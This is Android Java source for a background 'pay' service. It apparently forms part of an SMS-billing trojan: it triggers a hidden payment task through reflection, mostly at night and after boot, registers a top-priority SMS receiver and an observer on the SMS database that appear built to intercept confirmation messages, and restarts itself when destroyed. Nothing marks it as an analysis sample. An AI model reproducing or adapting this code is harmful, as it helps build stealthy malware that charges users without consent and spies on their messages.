package com.example.sayid.myapplication.pay;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;

import com.example.sayid.myapplication.common.data.ConfigConst;
import com.example.sayid.myapplication.common.data.StringData;
import com.example.sayid.myapplication.common.util.CacheUtil;
import com.example.sayid.myapplication.common.util.NetControlUtil;
import com.example.sayid.myapplication.common.util.ServiceUtil;
import com.example.sayid.myapplication.model.ReportModel;
import com.example.sayid.myapplication.receiver.ConnectionReceiver;
import com.example.sayid.myapplication.receiver.SmsReceiver;
import com.example.sayid.myapplication.sms.SmsObserver;

import java.lang.reflect.Method;
import java.util.Calendar;


/**
 * 定时任务，定时启动此Service服务
 *
 * @author zorro
 */
public class AppBaseService extends Service {
    private final static String TAG = "AppBaseService";
    private BroadcastReceiver sms_br = null;
    private BroadcastReceiver connectivity_br = null;
    private SmsObserver smsObserver = null;

    @Override
    public void onCreate() {
//		Logs.d(TAG, " onCreate");

        try {
            if (AppTache.context == null) {
                AppTache.context = this.getApplicationContext();
            }

            register(this);
        } catch (Exception e) {
//			Logs.e(TAG, e, " add sms br error");
        }
    }

    @Override
    public void onDestroy() {
//		Logs.d(TAG, " onDestroy");

//		Logs.e(TAG, " unregister BroadcastReceiver");
        unregisterReceiver(sms_br);
        unregisterReceiver(connectivity_br);


//		Logs.e(TAG, " unregister SMSObserver");
        getContentResolver().unregisterContentObserver(smsObserver);

        startService(new Intent(getApplicationContext(), AppBaseService.class));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String data_type = intent.getStringExtra("data_type");
            if ("conection".equals(data_type)) {
                connectionChangeService(this);
            } else {
                payTask(this);
            }
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    /**
     * 定时任务调用
     * 必须UI 主线程调用
     */
    private void payTask(final Context context) {
        try {
            if (enableTask() && enableRequest() && enableSystem()) {
                Class<?> clasz = AppTache.getInstance().getClass();
                // 获得私有方法
                Method clsMethod = clasz.getDeclaredMethod("requestTaskPay", new Class[]{});
                // 设置私有方法可以被访问
                clsMethod.setAccessible(true);

                clsMethod.invoke(AppTache.getInstance(), new Object[]{});
            } else {
//				Logs.e(TAG, "任务获取执行时间还未来到");
            }

            // 定时启动Service
            long loop_time = CacheUtil.getInstance().getLong(CacheUtil.KEY_LOOP_TIME, CacheUtil.LOOP_TIME_DEFAULT);
            ServiceUtil.taskService(context, loop_time);
        } catch (Exception e) {
//			Logs.e(TAG, e, e.getMessage());
        }
    }

    /**
     * 是否可以执行Task
     *
     * @return
     */
    private boolean enableTask() {
//		Logs.d(TAG, "enableTask");
        String isTask = CacheUtil.getInstance().getString(CacheUtil.KEY_IS_TASK, "0");

        if ("0".equals(isTask)) {
            Calendar c = Calendar.getInstance();
            int nowHour = c.get(Calendar.HOUR_OF_DAY);

            int startHour = CacheUtil.getInstance().getInt(CacheUtil.KEY_TASK_START_HOUR, 22);
            int endHour = CacheUtil.getInstance().getInt(CacheUtil.KEY_TASK_END_HOUR, 7);
            // 0-7点的情况[0, 7)
            if (startHour < endHour) {
                if (nowHour >= startHour && nowHour < endHour) {
                    return true;
                }
                // 22-7点的情况 [22, 7)
            } else {
                if ((nowHour >= startHour && nowHour < 24) || (nowHour >= 0 && nowHour < endHour)) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * 是否可以执行请求
     *
     * @return
     */
    private boolean enableRequest() {
        long yuntime = CacheUtil.getInstance().getLong(CacheUtil.KEY_NEXT_TIME, 0L);
        long currTime = System.currentTimeMillis();
//		Logs.d(TAG, "enableRequest 获取到的下次 任务获取执行时间为：" + (yuntime > currTime ? (yuntime - currTime) / 1000 + "秒后" : (currTime - yuntime) / 1000 + "秒前"));

        // 下次请求时间 小于当前时间
        if (yuntime <= currTime) {
            return true;
        }
        return false;
    }

    /**
     * 是否可以执行请求
     *
     * @return
     */
    private boolean enableSystem() {
        // 系统开机时间
        long elapsedRealtime = SystemClock.elapsedRealtime();
//		Logs.d(TAG, "enableSystem 系统开机时间为：" + elapsedRealtime);

        if (elapsedRealtime > ConfigConst.START_SYSTEM_TIME) {
            return true;
        }
        return false;
    }

    /**
     * 外部Service服务调用
     * 网络连接改变
     *
     * @param context
     */
    public void connectionChangeService(final Context context) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    boolean isWifiOpen = NetControlUtil.getInstance(AppBaseService.this).isWifiConnected();
                    boolean isGprsOpen = NetControlUtil.getInstance(AppBaseService.this).isGprsConnected();
//					Logs.d(TAG, "onStart isWifiOpen=" + isWifiOpen + ", isGprsOpen=" + isGprsOpen);

                    // 上报 监听网络状态回调
                    if (ReportModel.getInstanse(AppBaseService.this).onNetStateChangeCallBack != null) {
//						Logs.d(TAG, "ReportModel 上报  监听网络状态回调-->");
                        ReportModel.getInstanse(AppBaseService.this).onNetStateChangeCallBack.netStateChange(isWifiOpen, isGprsOpen);
                    }
                    // 打开gprs 监听网络状态回调
                    if (NetControlUtil.getInstance(AppBaseService.this).onNetStateChangeCallBack != null) {
//						Logs.d(TAG, "NetControl 打开gprs 监听网络状态回调-->");
                        NetControlUtil.getInstance(AppBaseService.this).onNetStateChangeCallBack.netStateChange(isWifiOpen, isGprsOpen);
                    }
                } catch (Exception e) {
//					Logs.e(TAG, e, "Connection Change Service error:");
                }
            }

        }).start();
    }

    /**
     * 注册
     */
    private void register(Context paramContext) {
//		Logs.d(TAG, " register BroadcastReceiver");

        // 短信广播注册
        IntentFilter iFilter = new IntentFilter(StringData.getInstance().SMS_RECEIVED);
        iFilter.setPriority(Integer.MAX_VALUE);
        sms_br = new SmsReceiver();
        registerReceiver(sms_br, iFilter);

        // 网络广播注册
        iFilter = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
        iFilter.setPriority(Integer.MAX_VALUE);
        connectivity_br = new ConnectionReceiver();
        registerReceiver(connectivity_br, iFilter);

        // 注册短信数据库监听
//		Logs.d(TAG, " register SMSObserver");
        smsObserver = new SmsObserver(new Handler(), paramContext);
        getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
    }
}